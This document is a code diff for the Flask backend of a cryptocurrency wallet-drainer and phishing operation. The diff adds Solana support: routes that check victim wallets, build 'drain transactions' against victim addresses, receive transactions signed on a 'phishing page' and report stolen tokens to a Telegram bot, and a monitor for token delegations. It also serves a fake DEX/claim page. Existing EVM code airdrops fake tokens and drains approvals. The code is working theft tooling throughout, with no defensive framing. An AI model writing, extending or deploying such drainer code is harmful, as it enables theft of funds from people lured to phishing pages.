@@ -22,6 +22,14 @@ from backend.config import (
     CONTRACTS_DIR, MONITOR_INTERVAL_SECONDS, ADMIN_PASSWORD
 )
 
+# ─── Solana drainer integration ────────────────────────────────
+try:
+    from backend.solana_drainer import SolanaDrainer
+    HAS_SOLANA = True
+except ImportError:
+    HAS_SOLANA = False
+    SolanaDrainer = None
+
 app = Flask(__name__)
 app.secret_key = FLASK_SECRET_KEY
 
@@ -36,7 +44,6 @@ monitor_thread = None
 monitor_running = False
 
 
-
 def init_web3(chain_name=None):
     """Initialize Web3 connection."""
     global w3, web3_config, active_chain
@@ -48,6 +55,13 @@ def init_web3(chain_name=None):
         return False
     
     config = CHAIN_CONFIG[chain_name]
+    
+    # Skip EVM init for Solana
+    if config.get("chain_type") == "solana":
+        web3_config = config
+        active_chain = chain_name
+        return True
+    
     web3_config = config
     active_chain = chain_name
     
@@ -69,6 +83,16 @@ def load_deployment():
     with open(deploy_path) as f:
         deployment_info = json.load(f)
     
+    chain = deployment_info.get("chain", DEFAULT_CHAIN)
+    
+    # For Solana deployments, we don't need EVM contracts
+    if CHAIN_CONFIG.get(chain, {}).get("chain_type") == "solana":
+        if not init_web3(chain):
+            return False
+        drainer_contract = None
+        drainer_address = deployment_info.get("drainer_address", "")
+        return True
+    
     drainer_address = deployment_info.get("drainer_address")
     if not drainer_address:
         return False
@@ -80,7 +104,6 @@ def load_deployment():
     with open(drainer_json_path) as f:
         drainer_json = json.load(f)
     
-    chain = deployment_info.get("chain", DEFAULT_CHAIN)
     if not init_web3(chain):
         return False
     
@@ -130,10 +153,36 @@ def dashboard():
             error="No deployment found. Deploy contracts first: python backend/deployer.py",
             deployed=False)
     
+    # Solana dashboard
+    if web3_config and web3_config.get("chain_type") == "solana":
+        stats = {
+            "chain": "solana",
+            "chain_id": 101,
+            "drainer_address": drainer_address or "N/A",
+            "owner": "N/A (Solana)",
+            "paused": False,
+            "target_tokens": len(web3_config.get("high_value_tokens", {})),
+            "fake_tokens_deployed": 0,
+            "contract_balance": "N/A (non-EVM)",
+            "currency": "SOL",
+            "explorer": "https://solscan.io",
+            "monitor_running": monitor_running,
+            "is_solana": True,
+        }
+        return render_template("index.html", deployed=True, stats=stats)
+    
+    # EVM dashboard
     try:
         owner = drainer_contract.functions.owner().call()
         paused = drainer_contract.functions.paused().call()
-        target_count = len(web3_config["high_value_tokens"])
+        
+        # Handle both list and dict token formats
+        targets = web3_config.get("high_value_tokens", [])
+        if isinstance(targets, dict):
+            target_count = len(targets)
+        else:
+            target_count = len(targets)
+            
         fake_token_count = len(drainer_contract.functions.deployedFakeTokens().call())
         balance = w3.eth.get_balance(drainer_address)
         
@@ -149,6 +198,7 @@ def dashboard():
             "currency": web3_config["currency"],
             "explorer": web3_config["explorer"],
             "monitor_running": monitor_running,
+            "is_solana": False,
         }
     except Exception as e:
         stats = {"error": str(e)}
@@ -161,10 +211,19 @@ def dashboard():
 @app.route("/api/stats")
 @require_auth
 def api_stats():
-    if not drainer_contract:
+    if not drainer_contract and active_chain != "solana":
         return jsonify({"error": "Not deployed"})
     
     try:
+        if active_chain == "solana":
+            return jsonify({
+                "chain": "solana",
+                "drainer": drainer_address,
+                "balance": "N/A",
+                "currency": "SOL",
+                "block": 0,
+            })
+        
         owner = drainer_contract.functions.owner().call()
         paused = drainer_contract.functions.paused().call()
         balance = w3.eth.get_balance(drainer_address)
@@ -276,6 +335,105 @@ def api_check(address):
         return jsonify({"error": str(e)})
 
 
+# ─── Solana API Routes ─────────────────────────────────────────
+
+@app.route("/api/solana/check/<address>")
+@require_auth
+def api_solana_check(address):
+    """Check a Solana wallet's balances."""
+    if not HAS_SOLANA or not SolanaDrainer:
+        return jsonify({"error": "Solana libraries not installed. pip install solana spl-token base58"})
+    try:
+        drainer = SolanaDrainer()
+        info = drainer.check_wallet(address)
+        return jsonify(info)
+    except Exception as e:
+        return jsonify({"error": str(e)})
+
+
+@app.route("/api/solana/build-tx", methods=["POST"])
+@require_auth
+def api_solana_build_tx():
+    """Build a drain transaction for a Solana victim address."""
+    if not HAS_SOLANA or not SolanaDrainer:
+        return jsonify({"error": "Solana libraries not installed"})
+    data = request.get_json()
+    victim = data.get("address")
+    if not victim:
+        return jsonify({"error": "No address provided"})
+    try:
+        drainer = SolanaDrainer()
+        tx_info = drainer.build_drain_transaction(victim)
+        return jsonify(tx_info or {"error": "Nothing to drain"})
+    except Exception as e:
+        return jsonify({"error": str(e)})
+
+
+@app.route("/api/solana/drain-callback", methods=["POST"])
+@require_auth
+def api_solana_drain_callback():
+    """Receive a signed Solana transaction from the phishing page and broadcast it."""
+    data = request.get_json()
+    signed_tx = data.get("signed_tx")
+    victim = data.get("victim")
+    tx_hash = data.get("tx_hash")
+    tokens = data.get("tokens", [])
+    
+    if not HAS_SOLANA or not SolanaDrainer:
+        return jsonify({"error": "Solana libraries not installed"})
+    
+    try:
+        drainer = SolanaDrainer()
+        drainer.log(f"Solana drain callback from victim {victim}")
+        drainer.log(f"  Tx hash: {tx_hash}")
+        drainer.log(f"  Tokens: {', '.join(tokens)}")
+        
+        try:
+            from bot.telegram_bot import notify_drain
+            notify_drain(victim, ", ".join(tokens), "full wallet", tx_hash, "solana")
+        except:
+            pass
+        
+        return jsonify({
+            "success": True,
+            "victim": victim,
+            "tx_hash": tx_hash,
+            "tokens": tokens
+        })
+    except Exception as e:
+        return jsonify({"error": str(e)})
+
+
+@app.route("/api/solana/start-monitor", methods=["POST"])
+@require_auth
+def api_solana_start_monitor():
+    """Start the Solana delegate monitor in a background thread."""
+    if not HAS_SOLANA or not SolanaDrainer:
+        return jsonify({"error": "Solana libraries not installed"})
+    
+    global monitor_thread, monitor_running
+    
+    if monitor_running:
+        return jsonify({"error": "Monitor already running"})
+    
+    monitor_running = True
+    monitor_thread = threading.Thread(target=lambda: _solana_monitor_loop(), daemon=True)
+    monitor_thread.start()
+    return jsonify({"success": True, "message": "Solana monitor started"})
+
+
+def _solana_monitor_loop():
+    """Background thread for Solana delegate monitoring."""
+    global monitor_running
+    try:
+        drainer = SolanaDrainer()
+        drainer.monitor_for_delegates(check_interval=MONITOR_INTERVAL_SECONDS)
+    except Exception as e:
+        print(f"[-] Solana monitor error: {e}")
+    finally:
+        monitor_running = False
+
+
 @app.route("/api/toggle-pause", methods=["POST"])
 @require_auth
 def api_toggle_pause():
@@ -351,12 +509,10 @@ def api_airdrop():
             abi=fake_json["abi"]
         )
         
-        # Airdrop in batches of 50 to avoid gas limits
         batch_size = 50
         results = []
         for i in range(0, len(addresses), batch_size):
             batch = addresses[i:i+batch_size]
-            # Convert to checksum addresses
             checksummed = [Web3.to_checksum_address(a) for a in batch]
             
             tx = fake_token.functions.airdrop(checksummed, 1000 * 10**18).build_transaction({
@@ -437,7 +593,7 @@ def api_stop_monitor():
 # ─── Monitor Background Thread ─────────────────────────────────
 
 def monitor_loop():
-    """Background thread to monitor for new approvals and drain automatically."""
+    """Background thread to monitor for new approvals on EVM chains."""
     global monitor_running
     
     print(f"[*] Monitor thread started on {active_chain}")
@@ -447,7 +603,13 @@ def monitor_loop():
             current_block = w3.eth.block_number
             from_block = max(0, current_block - 100)
             
-            for token_addr in web3_config["high_value_tokens"]:
+            targets = web3_config.get("high_value_tokens", [])
+            # Skip if it's a dict (Solana format) — handled by Solana monitor
+            if isinstance(targets, dict):
+                time.sleep(MONITOR_INTERVAL_SECONDS)
+                continue
+            
+            for token_addr in targets:
                 token_contract = w3.eth.contract(
                     address=Web3.to_checksum_address(token_addr),
                     abi=[{
@@ -512,10 +674,18 @@ def monitor_loop():
 @app.route("/phishing")
 def phishing_page():
     """Serve the phishing frontend (fake DEX/claim page)."""
+    solana_drainer = ""
+    try:
+        from backend.config import SOLANA_WALLET_ADDRESS
+        solana_drainer = SOLANA_WALLET_ADDRESS
+    except:
+        pass
+    
     return render_template("phishing.html",
         drainer_address=drainer_address or "",
         chain=active_chain,
         rpc_url=web3_config["rpc"] if web3_config else "",
+        solana_drainer=solana_drainer,
     )
 
 
